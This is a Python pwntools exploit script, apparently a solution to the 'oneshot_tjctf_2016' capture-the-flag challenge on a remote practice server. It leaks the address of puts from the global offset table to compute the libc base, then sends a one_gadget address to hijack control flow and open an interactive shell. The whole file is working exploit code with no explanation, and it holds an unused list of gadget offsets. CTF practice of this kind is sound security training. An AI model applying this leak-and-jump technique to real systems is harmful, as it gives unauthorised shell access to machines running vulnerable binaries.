from pwn import *

#context.log_level = 'debug'

#p = process('./oneshot_tjctf_2016')
p = remote('node4.buuoj.cn', 25047)
elf = ELF('oneshot_tjctf_2016')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.buu.so')

puts_got = elf.got['puts']

p.sendlineafter(b'Read location?\n', str(puts_got).encode())

p.recvuntil(b': ')
libc_base = int(p.recv(18), 16) - libc.sym['puts']

print('[+] libc_base -> {}'.format(hex(libc_base)))

one_gadgets = [0xe6c7e, 0xe6c81, 0xe6c84]

one_gadget = 0x45216 + libc_base

p.sendlineafter(b'Jump location?\n', str(one_gadget).encode())

p.interactive()